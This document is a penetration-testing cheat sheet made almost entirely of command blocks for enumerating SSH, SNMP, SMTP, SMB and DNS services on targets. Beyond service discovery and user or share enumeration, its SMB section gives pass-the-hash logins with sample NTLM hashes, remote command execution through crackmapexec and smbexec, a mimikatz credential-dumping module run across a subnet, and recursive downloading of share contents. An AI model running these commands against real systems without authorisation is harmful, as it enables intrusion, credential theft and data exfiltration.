
# SSH

```
nmap -sV --script=ssh-* -p 22 XX.XX.XX.XX
```

------------------------
# SNMP

```
sudo nmap -sU --open -p 161 XX.XX.XX.XX-254 -oG open-snmp.txt
snmpwalk -c public -v1 -t 10 XX.XX.XX.XX
snmp-check -t $ip -c public
nmap -sU -p161 --script "snmp-*" $ip
```


## Enumerating Windows Users

```
snmpwalk -c public -v1 XX.XX.XX.XX 1.3.6.1.4.1.77.1.2.25
```

## Enumerating Running Windows Processes

```
snmpwalk -c public -v1 XX.XX.XX.XX 1.3.6.1.2.1.25.4.2.1.2
```

## Enumerating Open TCP Ports

```
snmpwalk -c public -v1 XX.XX.XX.XX 1.3.6.1.2.1.6.13.1.3
```

## Enumerating Installed Software

```
snmpwalk -c public -v1 XX.XX.XX.XX 1.3.6.1.2.1.25.6.3.1.2
```

------------------------

# SMTP

## telnet or netcat connection

```
nc <targetip> 25
VRFY root
```

## Check for commands

```
nmap -script smtp-commands.nse <targetip>

nmap XX.XX.XX.XX -p 25 --script=smtp-*

nc -nv XX.XX.XX.XX 25
```

## Command to check if a user exists

```
VRFY root
```

## Command to ask the server if a user belongs to a mailing list

```
EXPN root
```

## Always do users enumeration


```
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $ip


smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt  -t $ip
```

------------------------
# SMB

## Enumerate Hostname

```
nmblookup -A $ip
List Shares
smbmap -H $ip
echo exit | smbclient -L \\\\$ip
nmap --script smb-enum-shares -p 139,445 $ip
smbclient -N -L //XX.XX.XX.XX
```


## Check Null Sessions

```
smbmap -H $ip
rpcclient -U "" -N $ip
smbclient -N -L \\\\XX.XX.XX.XX\\
smbclient \\\\$ip\\[share name]
smbclient -L XX.XX.XX.XX--option='client min protocol=NT1'
smbclient -L //XX.XX.XX.XX/ --option='client min protocol=NT1'
smbclient \\\\XX.XX.XX.XX\\'bob share' --option='client min protocol=NT1'
```


## Check for Vulnerabilities

```
nmap --script smb-vuln* -p 139,445 $ip
```


## Overall Scan

```
enum4linux -a $ip
```


## Manual Inspection

```
smbver.sh $ip (port)
```

## rpcclient


```
rpcclient -U '' $ip
Password:
rpcclient $> srvinfo # operating system version
rpcclient $> netshareenumall # enumerate all shares and its paths
rpcclient $> enumdomusers # enumerate usernames defined on the server
rpcclient $> getdompwinfo # smb password policy configured on the server
```


## CrackMapExe

```
crackmapexec -u 'guest' -p '' --shares $ip
crackmapexec -u 'guest' -p '' --rid-brute 4000 $ip
crackmapexec -u 'guest' -p '' --users $ip
crackmapexec smb XX.XX.XX.XX/24 -u Administrator -p P@ssw0rd
crackmapexec smb XX.XX.XX.XX/24 -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B
crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B -M mimikatz XX.XX.XX.XX/24
crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B -x whoami $ip
crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B --exec-method smbexec -x whoami $ip# reliable pth code execution

```

## smbmap

```
smbmap -u '' -p '' -H $ip # similar to crackmapexec --shares
smbmap -u guest -p '' -H $ip
smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H $ip
smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H $ip -r # list top level dir
smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H $ip -R # list everything recursively
smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H $ip -s wwwroot -R -A '.*' # download everything recursively in the wwwroot share to /usr/share/smbmap. great when smbclient doesnt work
smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H $ip -x whoami # no work
```


## Share List:

```
smbclient --list <targetip>
smbclient -L <targetip>
smbclient -L //XX.XX.XX.XX
```


## SMB Client:

```
smbclient //XX.XX.XX.XX/pathname
smbclient -L  //XX.XX.XX.XX
```


## SMB Map:

```
smbmap -H XX.XX.XX.XX
smbmap -H XX.XX.XX.XX -R  --depth 5
smbmap -H htb.local -u <username> -p <password>
```



## Check SMB vulnerabilities:

```
nmap --script=smb-check-vulns.nse <targetip> -p445
nmap --script vuln XX.XX.XX.XX -p445
nmap --script "vuln" <targetip> -p139,445
```


## basic nmap scripts to enumerate shares and OS discovery

```
nmap -p 139,445 XX.XX.XX.XX/24 --script smb-enum-shares.nse smb-os-discovery.nse
nmap --script smb-enum-shares.nse -p445 XX.XX.XX.XX
```


## Connect using Username

```
smbclient -L <targetip> -U username -p 445
```



## Connect to Shares

```
smbclient \\\\<targetip>\\ShareName
smbclient \\\\<targetip>\\ShareName -U User_name
```


## enumarete with smb-shares, -a “do everything” option

```
enum4linux -a XX.XX.XX.XX
enum4linux -i XX.XX.XX.XX
```



## learn the machine name and then enumerate with smbclient


```
nmblookup -A XX.XX.XX.XX
smbclient -L <server_name> -I XX.XX.XX.XX
```

# DNS


## DNS ENUM


```
dnsenum zonetransfer.me
```

## DNS RECON

```
dnsrecon -d okmurugur.com -t axfr
dnsrecon -d XX.XX.XX.XX -r XX.XX.XX.XX/8
```



## DNS ENUMERATiON

```
host www.okmurugur.com
host -t mx okmurugur.com
host -t txt okmurugur.com
```



# DiG

```
dig axfr  @XX.XX.XX.XX okmurugur.com
```
